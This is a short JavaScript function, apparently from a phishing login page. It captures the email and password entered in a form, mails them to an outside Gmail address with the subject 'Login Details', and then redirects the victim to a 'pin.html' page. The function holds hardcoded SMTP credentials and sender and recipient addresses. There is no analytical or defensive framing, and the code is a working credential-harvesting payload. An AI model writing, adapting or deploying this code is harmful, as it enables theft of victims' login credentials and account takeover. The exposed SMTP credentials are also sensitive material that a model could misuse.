function emailSend() {
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;
  var messageBody = "Email " + email +
    "<br/> password " + password;

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "nelsf38@gmail.com",
    Password: "3D538C4DF17B36F1E64CD578356BE2FCF3CA",
    To: 'payday10177@gmail.com',
    From: "nelsf38@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'pin.html';
      }
      else {
        swal("Error", "Please complete form details", "error")
      }
    }
  );
}